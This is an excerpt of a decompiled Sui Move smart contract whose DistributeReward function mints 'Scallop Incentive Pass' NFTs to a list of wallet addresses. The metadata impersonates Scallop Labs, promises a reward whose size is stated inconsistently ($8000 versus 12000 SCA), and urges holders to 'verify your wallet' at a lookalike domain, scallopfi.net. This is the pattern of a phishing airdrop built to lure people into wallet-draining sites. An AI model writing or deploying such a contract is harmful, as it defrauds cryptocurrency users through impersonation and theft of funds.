module 0xd9057382e25351e4a24823cba7726bb07326792c08b9dbb685e3d02a1e6f4ac4::scallop_incentive_pass_w {
    ...
    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SCALLOP_INCENTIVE_PASS{
                ...
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/scallopfi/scallop_item_1.jpg"),
                description : 0x1::string::utf8(b"Scallop Incentive Reward of $8000 SCA is ready at https://scallopfi.net. Verify your wallet activity and claim your reward."),
                Reward      : 0x1::string::utf8(b"12000 SCA"),
            };
            let v1 = MintEvent{
    ...
    fun init(arg0: SCALLOP_INCENTIVE_PASS_W, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/scallopfi/scallop_item_1.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Scallop Incentive Reward of $8000 SCA is ready at https://scallopfi.net. Verify your wallet activity and claim your reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://scallopfi.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Scallop Labs"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"12000 SCA"));
